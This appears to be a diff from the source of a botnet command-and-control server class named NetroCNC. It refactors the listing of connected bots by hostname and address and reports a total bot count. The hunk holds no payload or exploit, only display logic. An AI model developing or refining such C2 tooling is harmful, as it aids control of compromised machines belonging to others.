@@ -158,22 +158,22 @@ class NetroCNC(object):
             return "No bots connected."
 
         client_socks = self.bot_hostnames.copy()
+        client_hostnames = dict((v, k) for k, v in client_socks.items())
 
         sep1 = 10
 
-        for client_sock in client_socks:
-            se1 = len(str(f"{client_socks[client_sock]}"))
+        for hostname in client_hostnames:
+            se1 = len(str(hostname))
 
             if se1 > sep1:
                 sep1 = se1 + 2
 
         output = f"Hostname{' ' * int(sep1 - 8)}Address\n\n"
 
-        for client_sock in client_socks:
-            client_host, client_port = client_sock.getpeername()
+        for hostname in sorted(client_hostnames):
+            client_host, client_port = client_hostnames[hostname].getpeername()
             client_address = f"{client_host}:{client_port}"
-            client_hostname = client_socks[client_sock]
-            output += f"{client_hostname}{' ' * int(sep1 - len(client_hostname))}{client_address}\n"
+            output += f"{hostname}{' ' * int(sep1 - len(hostname))}{client_address}\n"
         
         output += f"\nTotal Bots: {len(client_socks)}"
         
